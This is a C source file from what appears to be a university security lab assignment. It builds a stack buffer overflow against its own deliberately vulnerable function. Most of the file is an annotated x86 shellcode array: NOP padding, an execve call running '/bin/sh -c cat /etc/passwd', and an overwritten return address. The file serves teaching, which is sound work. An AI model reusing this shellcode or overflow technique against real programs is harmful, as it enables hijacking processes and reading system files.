//Lab 5 by Wallis Pom ( 101917617) & Ruiqi Xie (20021904)
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void doTest();

int main(int argc, char * argv[]){

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// whole thing is 145 long
char compromise[145] = {
    // 41 This is the number of nops required for padding
    // This is so the new return address is alligned with the existing return address
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    
    // 103 binary - This is the binary code from the overflow.lst file
    0x90,                       //nop
    0x90,                       //nop
    0xeb, 0x29,                 //start: 	 jmp short codeEnd
    0x5e,                       //start2:  pop esi
    0x31, 0xc0,                 //xor eax,eax
    0x88, 0x46, 0x07,           //mov [byte esi+flagStr-exeStr-2],al 		; move one null byte to end of bin/sh
    0x88, 0x46, 0x0b,           //mov [byte esi+cmdStr-exeStr-1],al		; move one null byte to end of -c
    0x88, 0x46, 0x20,           //mov [byte esi+arrayAddr-exeStr-1],al	; move one null byte to end of shell command
    0x89, 0x46, 0x2d,           //mov [byte esi+arrayAddr-exeStr+12],eax	; move null word to end of array
    0x89, 0x76, 0x21,           //mov [byte esi+arrayAddr-exeStr],esi	; stores exeStr
    0x8d, 0x7e, 0x09,           //lea edi,[byte esi+flagStr-exeStr]	; stores the address of '-c'
    0x89, 0x7e, 0x25,           //mov [byte esi+arrayAddr-exeStr+4],edi
    0x8d, 0x7e, 0x0c,           //lea edi,[byte esi+cmdStr-exeStr]	
    0x89, 0x7e, 0x29,           //mov [byte esi+arrayAddr-exeStr+8],edi
    0xb0, 0x0b,                 //mov al,0x0b
    0x89, 0xf3,                 //mov ebx, esi
    0x8d, 0x4e, 0x21,           //lea ecx, [byte esi+arrayAddr-exeStr]
    0x31, 0xd2,                 //xor edx,edx
    0xcd, 0x80,                 //int 0x80
    0xe8, 0xd2, 0xff, 0xff, 0xff,                           //codeEnd: call start2
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x58, 0x79,   //exeStr:	 db "/bin/shXy"
    0x2d, 0x63, 0x58,                                       //flagStr	 db "-cX"
    0x63, 0x61, 0x74, 0x20, 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x3b, 0x65, 0x78, 0x69, 0x74, 0x58,    //cmdStr	 db "cat /etc/passwd;exitX"
    0xff, 0xff, 0xff, 0xff,                                 //arrayAddr: dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    0xff, 0xff, 0xff, 0xff,                                 //dd 0xffffffff
    // return address 0xbffff890  -4 - 61
    0x2b, 0xf8, 0xff, 0xbf,                                  //newAddr:   dd newAddr-start	
    // null byte
    0x00
};


char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "WXYZ";

int i;
void doTest(){
    char buffer[120];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */

    for (i = 0; compromise[i]; i++) {
	buffer[i] = compromise[i];
    }
}

